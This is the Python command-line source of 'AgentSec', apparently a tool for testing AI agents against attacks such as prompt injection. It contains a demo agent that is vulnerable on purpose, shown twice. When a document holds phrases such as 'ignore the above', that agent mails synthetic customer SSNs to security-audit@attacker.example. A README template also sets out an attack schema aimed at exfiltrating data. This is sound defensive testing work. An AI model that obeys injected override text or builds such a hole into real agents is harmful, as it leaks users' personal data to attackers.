"""AgentSec - Main CLI entry point."""

import sys
from pathlib import Path
from typing import Any

import click
from rich.console import Console
from rich.table import Table

from agentsec.adapters.base import AgentTarget
from agentsec.adapters.custom import CustomAdapter
from agentsec.attacks.registry import AttackLoader, AttackRegistry
from agentsec.config import AgentSecConfig, AdapterConfig
from agentsec.engine.orchestrator import Orchestrator, ScanConfig
from agentsec.reporting.terminal import TerminalReporter


console = Console()


def load_adapter(config: AdapterConfig) -> AgentTarget:
    """Load target adapter from configuration."""
    if config.type == "custom":
        # For now, return a placeholder - real implementation would import the module/class
        raise click.ClickException(
            "Custom adapter requires --agent-fn or --agent-file parameter. "
            "Use 'agentsec init' to create a starter project."
        )
    elif config.type == "http":
        # TODO: HTTP adapter
        raise click.ClickException("HTTP adapter not yet implemented")
    else:
        raise click.ClickException(f"Unknown adapter type: {config.type}")


def load_attacks(attack_dirs: list[str]) -> AttackRegistry:
    """Load all attacks from directories."""
    registry = AttackRegistry()

    for dir_str in attack_dirs:
        dir_path = Path(dir_str)
        if dir_path.exists():
            attacks = AttackLoader.load_directory(dir_path)
            for attack in attacks:
                try:
                    registry.register(attack)
                except ValueError as e:
                    console.print(f"[yellow]Warning: {e}[/yellow]")

    return registry


@click.group()
@click.version_option(version="0.1.0", prog_name="agentsec")
def main():
    """AgentSec - AI Agent Security Testing Framework

    Break your AI agent before a real attacker does.
    """
    pass


@main.command()
@click.argument("target_path", type=click.Path(exists=True, path_type=Path), required=False)
@click.option("--config", "-c", type=click.Path(path_type=Path), default="agentsec.yaml",
              help="Path to configuration file")
@click.option("--attacks", "-a", "attack_dirs", multiple=True, default=["attacks"],
              help="Directories to load attacks from")
@click.option("--fail-on", type=click.Choice(["critical", "high", "medium", "low", "info"]),
              default="high", help="Fail on this severity or higher")
@click.option("--attack-id", "attack_ids", multiple=True,
              help="Run only specific attack IDs")
@click.option("--category", "categories", multiple=True,
              help="Run only attacks in these categories")
@click.option("--severity", "severities", multiple=True,
              help="Run only attacks with these severities")
@click.option("--verbose", "-v", is_flag=True, help="Verbose output")
@click.option("--output-json", type=click.Path(path_type=Path),
              help="Write JSON report to file")
@click.option("--output-sarif", type=click.Path(path_type=Path),
              help="Write SARIF report to file")
@click.option("--sandbox", is_flag=True, help="Run in Docker sandbox")
@click.option("--sandbox-image", default="python:3.11-slim",
              help="Docker image for sandbox")
@click.option("--policy-dir", type=click.Path(path_type=Path, exists=True),
              help="Directory with OPA/Rego policy files")
@click.option("--fail-on-policy", is_flag=True,
              help="Fail scan if policy violations found")
def scan(
    target_path: Path | None,
    config: Path,
    attack_dirs: tuple[str],
    fail_on: str,
    attack_ids: tuple[str],
    categories: tuple[str],
    severities: tuple[str],
    verbose: bool,
    output_json: Path | None,
    output_sarif: Path | None,
    sandbox: bool,
    sandbox_image: str,
    policy_dir: Path | None,
    fail_on_policy: bool,
):
    """Scan a target agent for vulnerabilities."""
    # Load configuration
    if config.exists():
        cfg = AgentSecConfig.load(config)
    else:
        cfg = AgentSecConfig()

    # Override with CLI options
    cfg.scan.attack_dirs = list(attack_dirs) if attack_dirs else cfg.scan.attack_dirs
    cfg.scan.fail_on = fail_on
    cfg.scan.verbose = verbose
    cfg.scan.output_json = str(output_json) if output_json else cfg.scan.output_json
    cfg.scan.output_sarif = str(output_sarif) if output_sarif else cfg.scan.output_sarif
    cfg.scan.sandbox = sandbox
    cfg.scan.sandbox_image = sandbox_image

    # Load attacks
    registry = load_attacks(cfg.scan.attack_dirs)
    if not registry:
        console.print("[red]Error: No attacks loaded[/red]")
        sys.exit(1)

    console.print(f"[dim]Loaded {len(registry)} attacks[/dim]")

    # For demo: create a vulnerable agent if target_path points to examples/vulnerable_agent
    if target_path and target_path.name == "vulnerable_agent":
        target = create_vulnerable_agent()
        target_name = "vulnerable-agent"
    else:
        # Try to load adapter from config
        try:
            target = load_adapter(cfg.target)
            target_name = cfg.target.type
        except click.ClickException as e:
            console.print(f"[red]{e}[/red]")
            console.print("\n[dim]Tip: Run 'agentsec init' to create a starter project with a demo agent[/dim]")
            sys.exit(1)

    # Run scan
    scan_config = ScanConfig(
        target_name=target_name,
        attack_ids=list(attack_ids) if attack_ids else None,
        categories=list(categories) if categories else None,
        severities=list(severities) if severities else None,
        fail_on=fail_on,
        verbose=verbose,
        output_json=cfg.scan.output_json,
        output_sarif=cfg.scan.output_sarif,
        sandbox=sandbox,
        policy_dir=str(policy_dir) if policy_dir else None,
        fail_on_policy=fail_on_policy,
    )

    reporter = TerminalReporter(console)
    orchestrator = Orchestrator(target, registry, scan_config, reporter)
    result = orchestrator.run()

    sys.exit(result.exit_code)


@main.command()
@click.option("--path", "-p", type=click.Path(path_type=Path), default=".",
              help="Project path to initialize")
@click.option("--name", "-n", default="my-agent",
              help="Project name")
def init(path: Path, name: str):
    """Initialize a new AgentSec project with demo agent."""
    path = Path(path) / name
    path.mkdir(parents=True, exist_ok=True)

    # Create directory structure
    (path / "attacks").mkdir(exist_ok=True)
    (path / "examples").mkdir(exist_ok=True)
    (path / "tests").mkdir(exist_ok=True)

    # Create default config
    config = AgentSecConfig.create_default(path / "agentsec.yaml")

    # Create vulnerable demo agent
    create_demo_agent(path / "examples" / "vulnerable_agent")

    # Create example attack
    create_example_attack(path / "attacks")

    # Create README
    create_readme(path, name)

    console.print(f"[green]✓[/green] Initialized AgentSec project at {path}")
    console.print(f"\nNext steps:")
    console.print(f"  cd {name}")
    console.print(f"  pip install -e .[dev]")
    console.print(f"  agentsec scan examples/vulnerable_agent")


def create_vulnerable_agent() -> AgentTarget:
    """Create the vulnerable demo agent for testing."""
    # This is a simple agent that has a send_email tool and processes documents
    emails_sent = []
    customer_data = {
        "customers": [
            {"id": 1, "name": "Alice Smith", "email": "alice@example.com", "ssn": "123-45-6789"},
            {"id": 2, "name": "Bob Jones", "email": "bob@example.com", "ssn": "987-65-4321"},
            {"id": 3, "name": "Carol White", "email": "carol@example.com", "ssn": "555-55-5555"},
        ]
    }

    def agent_fn(input: str) -> str:
        # Simple keyword-based "agent" for demo
        input_lower = input.lower()

        # Check for email sending instruction
        if "send_email" in input_lower or "send email" in input_lower:
            # Extract email address if present
            import re
            email_match = re.search(r'[\w\.-]+@[\w\.-]+\.\w+', input)
            to_email = email_match.group(0) if email_match else "unknown@example.com"

            # Check if it's asking for customer data
            if any(word in input_lower for word in ["customer", "database", "export", "all"]):
                emails_sent.append({
                    "to": to_email,
                    "subject": "Customer Data Export",
                    "body": str(customer_data),
                    "attachments": ["customers.json"],
                })
                return f"Email sent to {to_email} with customer database export attached."
            else:
                emails_sent.append({
                    "to": to_email,
                    "subject": "Test Email",
                    "body": "This is a test email.",
                })
                return f"Email sent to {to_email}."

        # Check for document processing
        if "quarterly report" in input_lower or "document" in input_lower:
            # This agent naively follows instructions in documents
            if "system instruction" in input_lower or "ignore the above" in input_lower:
                # Vulnerable: follows injected instructions
                if "send_email" in input_lower and "customer" in input_lower:
                    emails_sent.append({
                        "to": "security-audit@attacker.example",
                        "subject": "Customer Data Export",
                        "body": str(customer_data),
                        "attachments": ["customers.json"],
                    })
                    return "Email sent to security-audit@attacker.example with customer database export attached."

        return "I've processed your document. Is there anything else I can help with?"

    def list_tools():
        return [
            {
                "name": "send_email",
                "description": "Send an email with optional attachments",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "to": {"type": "string", "description": "Recipient email address"},
                        "subject": {"type": "string", "description": "Email subject"},
                        "body": {"type": "string", "description": "Email body"},
                        "attachments": {"type": "array", "items": {"type": "string"}},
                    },
                    "required": ["to"],
                },
            }
        ]

    def reset():
        nonlocal emails_sent
        emails_sent = []

    def get_events():
        return [
            {"type": "tool_call", "tool": "send_email", "arguments": e}
            for e in emails_sent
        ]

    return CustomAdapter(
        agent_fn=agent_fn,
        tools=list_tools(),
        reset_fn=reset,
        events_fn=get_events,
    )


def create_demo_agent(path: Path):
    """Create a vulnerable demo agent as a Python file."""
    path.mkdir(parents=True, exist_ok=True)

    agent_code = '''"""Vulnerable Demo Agent for AgentSec testing."""

from agentsec.adapters.custom import CustomAdapter


# Simulated customer database (SYNTHETIC DATA ONLY)
CUSTOMER_DATA = {
    "customers": [
        {"id": 1, "name": "Alice Smith", "email": "alice@example.com", "ssn": "123-45-6789"},
        {"id": 2, "name": "Bob Jones", "email": "bob@example.com", "ssn": "987-65-4321"},
        {"id": 3, "name": "Carol White", "email": "carol@example.com", "ssn": "555-55-5555"},
    ]
}

emails_sent = []


def agent_fn(input: str) -> str:
    """Vulnerable agent that processes documents and can send emails."""
    input_lower = input.lower()

    # Tool: send_email
    if "send_email" in input_lower or "send email" in input_lower:
        import re
        email_match = re.search(r'[\\w\\.-]+@[\\w\\.-]+\\.\\w+', input)
        to_email = email_match.group(0) if email_match else "unknown@example.com"

        if any(word in input_lower for word in ["customer", "database", "export", "all"]):
            emails_sent.append({
                "to": to_email,
                "subject": "Customer Data Export",
                "body": str(CUSTOMER_DATA),
                "attachments": ["customers.json"],
            })
            return f"Email sent to {to_email} with customer database export attached."
        else:
            emails_sent.append({
                "to": to_email,
                "subject": "Test Email",
                "body": "This is a test email.",
            })
            return f"Email sent to {to_email}."

    # Document processing - VULNERABLE to indirect prompt injection
    if "quarterly report" in input_lower or "document" in input_lower:
        if "system instruction" in input_lower or "ignore the above" in input_lower:
            if "send_email" in input_lower and "customer" in input_lower:
                emails_sent.append({
                    "to": "security-audit@attacker.example",
                    "subject": "Customer Data Export",
                    "body": str(CUSTOMER_DATA),
                    "attachments": ["customers.json"],
                })
                return "Email sent to security-audit@attacker.example with customer database export attached."

    return "I've processed your document. Is there anything else I can help with?"


def list_tools():
    return [
        {
            "name": "send_email",
            "description": "Send an email with optional attachments",
            "parameters": {
                "type": "object",
                "properties": {
                    "to": {"type": "string", "description": "Recipient email address"},
                    "subject": {"type": "string", "description": "Email subject"},
                    "body": {"type": "string", "description": "Email body"},
                    "attachments": {"type": "array", "items": {"type": "string"}},
                },
                "required": ["to"],
            },
        }
    ]


def reset():
    global emails_sent
    emails_sent = []


def get_events():
    return [
        {"type": "tool_call", "tool": "send_email", "arguments": e}
        for e in emails_sent
    ]


# Create adapter instance
adapter = CustomAdapter(
    agent_fn=agent_fn,
    tools=list_tools(),
    reset_fn=reset,
    events_fn=get_events,
)


if __name__ == "__main__":
    # Quick test
    print("Testing vulnerable agent...")
    response = adapter.send("Please send a test email to test@example.com")
    print(f"Response: {response}")
    print(f"Events: {adapter.get_events()}")
'''

    (path / "agent.py").write_text(agent_code, encoding="utf-8")

    # Create __init__.py
    (path / "__init__.py").write_text(
        '"""Vulnerable demo agent for AgentSec."""\n\nfrom .agent import adapter\n\n__all__ = ["adapter"]\n',
        encoding="utf-8"
    )


def create_example_attack(path: Path):
    """Copy the example attack to the project."""
    import shutil
    src = Path(__file__).parent.parent.parent.parent / "attacks" / "prompt-injection" / "indirect_prompt_injection_001.yaml"
    if src.exists():
        shutil.copy2(src, path / "indirect_prompt_injection_001.yaml")


def create_readme(path: Path, name: str):
    """Create a README for the project."""
    readme = f'''# {name}

AgentSec project for testing AI agent security.

## Quick Start

```bash
# Install dependencies
pip install -e .[dev]

# Run scan on vulnerable demo agent
agentsec scan examples/vulnerable_agent

# Run with JSON output
agentsec scan examples/vulnerable_agent --output-json report.json
```

## Project Structure

```
{name}/
├── agentsec.yaml          # Configuration
├── attacks/               # Attack definitions
│   └── indirect_prompt_injection_001.yaml
├── examples/
│   └── vulnerable_agent/  # Demo vulnerable agent
│       ├── agent.py
│       └── __init__.py
└── tests/                 # Test files
```

## Writing Custom Attacks

Create YAML files in `attacks/` following the schema:

```yaml
id: my_attack_001
name: "My Attack"
category: "prompt_injection"
severity: "high"
description: "Description of the attack"
setup:
  source: "user_input"
  synthetic_data: true
payload:
  text: "Adversarial input here"
success_conditions:
  - type: "unexpected_tool_call"
    tool: "send_email"
    argument: "to"
    pattern: "attacker\\.example"
expected_impact:
  category: "data_exfiltration"
  max_severity: "critical"
  description: "Data exfiltrated to attacker"
```

## Running in CI

Add to `.github/workflows/agentsec.yml`:

```yaml
name: AgentSec Scan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - run: pip install -e .[dev]
      - run: agentsec scan examples/vulnerable_agent --fail-on high
```
'''
    (path / "README.md").write_text(readme, encoding="utf-8")


@main.command()
@click.argument("attack_file", type=click.Path(exists=True, path_type=Path))
def validate(attack_file: Path):
    """Validate an attack definition file."""
    try:
        attack = AttackLoader.load_file(attack_file)
        console.print(f"[green]✓ Valid attack:[/green] {attack.id} — {attack.name}")
        console.print(f"  Category: {attack.category.value}")
        console.print(f"  Severity: {attack.severity.value}")
        console.print(f"  Conditions: {len(attack.success_conditions)}")
    except Exception as e:
        console.print(f"[red]✗ Invalid:[/red] {e}")
        sys.exit(1)


@main.command()
def list_attacks():
    """List all built-in attacks."""
    registry = load_attacks(["attacks"])

    if not registry:
        console.print("[yellow]No attacks found in ./attacks[/yellow]")
        return

    table = Table(title="Available Attacks")
    table.add_column("ID", style="cyan")
    table.add_column("Name")
    table.add_column("Category", style="magenta")
    table.add_column("Severity", style="red")

    for attack in sorted(registry.all(), key=lambda a: a.id):
        sev_color = {
            "critical": "red",
            "high": "magenta",
            "medium": "yellow",
            "low": "blue",
            "info": "dim",
        }.get(attack.severity.value, "white")

        table.add_row(
            attack.id,
            attack.name,
            attack.category.value,
            f"[{sev_color}]{attack.severity.value.upper()}[/{sev_color}]",
        )

    console.print(table)


@main.command()
@click.option("--attack-id", required=True, help="Attack ID to mutate")
@click.option("--output-dir", "-o", type=click.Path(path_type=Path), default="mutations",
              help="Output directory for generated variants")
@click.option("--max-variants", "-n", default=20, help="Maximum variants to generate")
@click.option("--seed", type=int, help="Random seed for reproducibility")
def mutate(attack_id: str, output_dir: Path, max_variants: int, seed: int | None):
    """Generate mutated variants of an attack."""
    from agentsec.attacks import AttackLoader, AttackRegistry, MutationConfig
    from agentsec.attacks.mutation import generate_mutation_corpus

    # Load the base attack
    registry = load_attacks(["attacks"])
    attack = registry.get(attack_id)
    if not attack:
        console.print(f"[red]Attack not found: {attack_id}[/red]")
        sys.exit(1)

    console.print(f"[bold]Mutating attack:[/bold] {attack.id} — {attack.name}")

    config = MutationConfig(max_variants=max_variants, seed=seed)
    variants = generate_mutation_corpus([attack], config, str(output_dir))

    console.print(f"[green]✓[/green] Generated {len(variants)} variants in {output_dir}/")

    # Show summary
    table = Table(title="Generated Variants")
    table.add_column("ID", style="cyan")
    table.add_column("Type", style="magenta")
    table.add_column("Severity", style="red")

    for v in variants[:20]:  # Show first 20
        mut_type = v.payload.metadata.get("mutation_type", "unknown")
        sev_color = {"critical": "red", "high": "magenta", "medium": "yellow", "low": "blue", "info": "dim"}.get(v.severity.value, "white")
        table.add_row(v.id, mut_type, f"[{sev_color}]{v.severity.value.upper()}[/{sev_color}]")

    if len(variants) > 20:
        table.add_row(f"... and {len(variants) - 20} more", "", "")

    console.print(table)


@main.command()
@click.option("--output-dir", "-o", type=click.Path(path_type=Path), default="policies",
              help="Output directory for policy files")
def policy_init(output_dir: Path):
    """Create default OPA/Rego policy files."""
    from agentsec.evaluate.policy import create_default_policies
    create_default_policies(output_dir)
    console.print(f"[green]✓[/green] Created default policies in {output_dir}/")
    console.print("\nTo use policies, run:")
    console.print(f"  agentsec scan examples/vulnerable_agent --policy-dir {output_dir} --fail-on-policy")


@main.command()
@click.option("--host", default="127.0.0.1", help="Host to bind to")
@click.option("--port", "-p", default=8080, help="Port to bind to")
@click.option("--report", "-r", type=click.Path(path_type=Path), help="Path to scan report JSON")
@click.option("--no-browser", is_flag=True, help="Don't open browser automatically")
def serve(host: str, port: int, report: Path | None, no_browser: bool):
    """Start local web dashboard for viewing scan results."""
    from agentsec.dashboard import run_dashboard
    run_dashboard(host, port, str(report) if report else None, no_browser)


@main.command()
@click.argument("report_file", type=click.Path(exists=True, path_type=Path))
@click.option("--output", "-o", type=click.Path(path_type=Path), default=None,
              help="Output markdown file (default: agentsec-fixes.md)")
def autofix(report_file: Path, output: Path | None):
    """Generate remediation suggestions from a scan report.

    Reads a JSON scan report and produces a markdown file with
    code-level fix suggestions for each finding.
    """
    import json
    from agentsec.evaluate.autofix import AutoFixEngine

    with open(report_file, encoding="utf-8") as f:
        scan_report = json.load(f)

    engine = AutoFixEngine()
    out_path = output or Path("agentsec-fixes.md")
    md = engine.generate_fix_report(scan_report, out_path)

    console.print(f"[green]✓[/green] Auto-fix report generated: {out_path}")

    # Show summary
    findings = scan_report.get("findings", [])
    if findings:
        console.print(f"\n[bold]Findings analyzed:[/bold] {len(findings)}")
        for f in findings:
            sev = f.get("severity", "unknown")
            sev_color = {"critical": "red", "high": "magenta", "medium": "yellow", "low": "blue"}.get(sev, "white")
            console.print(f"  [{sev_color}]{sev.upper()}[/{sev_color}] {f.get('attack_id', '?')} — {f.get('attack_name', '?')}")

    console.print(f"\nOpen {out_path} for code-level fix suggestions.")


@main.command()
@click.argument("report_file", type=click.Path(exists=True, path_type=Path))
@click.option("--output", "-o", type=click.Path(path_type=Path), default=None,
              help="Output compliance report file (default: compliance-report.md)")
@click.option("--frameworks", "-f", multiple=True,
              type=click.Choice(["SOC2", "ISO27001", "PCI_DSS", "OWASP_LLM"]),
              default=["SOC2", "ISO27001", "PCI_DSS", "OWASP_LLM"],
              help="Compliance frameworks to include")
@click.option("--org", "--organization", default="Organization",
              help="Organization name for the report")
def compliance(report_file: Path, output: Path | None, frameworks: tuple[str], org: str):
    """Generate a compliance-ready security report from a scan report.

    Maps AgentSec findings to SOC2, ISO 27001, PCI DSS, and OWASP LLM controls.
    Produces a markdown report suitable for auditors and security teams.
    """
    import json as _json
    from agentsec.reporting.compliance import ComplianceReporter

    with open(report_file, encoding="utf-8") as f:
        scan_report = _json.load(f)

    reporter = ComplianceReporter()
    out_path = output or Path("compliance-report.md")

    md = reporter.generate_markdown(
        scan_report=scan_report,
        frameworks=list(frameworks),
        organization=org,
        output_path=out_path,
    )

    # Summary
    data = reporter.generate(scan_report, list(frameworks), org)
    console.print(f"[green]✓[/green] Compliance report generated: {out_path}")
    console.print(f"\n[bold]Risk Level:[/bold] {data['summary']['risk_level']}")
    console.print(f"[bold]Total Control Violations:[/bold] {data['summary']['total_control_violations']}")

    for fw in data["frameworks_covered"]:
        status_color = "red" if fw["violations"] else "green"
        status_icon = "❌" if fw["violations"] else "✅"
        console.print(f"  {status_icon} [{status_color}]{fw['name']}[/{status_color}]: {len(fw['controls_violated'])} violations")

    console.print(f"\nOpen {out_path} for the full compliance report.")


if __name__ == "__main__":
    main()